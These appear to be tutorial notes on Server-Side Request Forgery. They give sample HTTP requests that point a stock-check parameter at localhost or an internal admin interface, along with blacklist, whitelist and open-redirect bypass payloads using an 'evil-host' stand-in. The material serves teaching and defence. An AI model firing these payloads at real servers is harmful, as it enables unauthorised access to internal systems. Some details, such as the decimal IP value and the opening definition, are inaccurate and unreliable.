<h4>Server-Side Request Forgery (SSRF)</h4>


Server-side request forgery attack allows attacker anto to trick server-side applications into allowing access to the server modifying files. ``SSRF can be successful if the target application reads that from a url without sanitizing it.``
--- ---
**`MITIGATION`**
```
1.Mitigate with firewall
2.Whitelisting and DNS Resolution
3.Authentication on Internal Services
4.Response Handling
5.Validation of user input
```
--- ---

**`Common Attacks`**

Attacks Against the Server Itself
- Attacker induces the application to make an HTTP request back to the server that is hosting the application (via loopback)
- Involves supplying the URL with a hostname like 127.0.0.1 or localhost
- Example code -- shopping application that allows user to check stock
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D
6%26storeId%3D1
```
	- Makes request to the URL
	- Retrieves the stock status
	- Return to the user
- Modify this for an attack:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-
urlencoded
Content-Length: 118
stockApi=http://localhost/admin
```
	- Server fetches contents of the /admin url and returns to the user
	- Authenticates as the machine/server itself

Attacks Against Other Systems
- Assume there is an administrative interface at https://192.168.0.68/admin
- Attack can exploit and access this:
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-
urlencoded
Content-Length: 118
stockApi=http://192.168.0.68/admin
```

Circumventing Common SSRF Defenses

--- ---

<h4>Bypassing SSRF Defenses</h4>

It is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.

Bypassing Blacklist-Based Input Filters
- Applications often block input containing hostnames (127.0.0.1) or URLs (/admin)

- Bypass in these ways:
	- Use an alternative IP representation of 127.0.0.1 (21307066433)
	- Register your own domain that resolves to 127.0.0.1 (spoofed.burpcollaborator.net)
	- Obfuscate block strings using URL encoding or case variation

Bypassing Whitelist-Based Input Filters
```
- Embed creds in a URL before the hostname:
https://expected-host@evil
-host
```

- Use the # character to indicate a URL fragment:
```
https://evil-
host#expected-host
```

- Leverage DNS naming hierarchy to place required input into a fully-qualified DNS name you control:
```
https://expected-host.evil
-host
```

- URL-encode characters to confuse the URL-parsing code

- Combine these various techniques together

Bypassing with Open Redirection
- Suppose the following is true:
	- User-submitted URL is strictly validated
	- Application contains an open redirection vulnerability
- Construct a URL that meets the filter but redirects to a back-end target
```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://1
92.168.0.68/admin
```
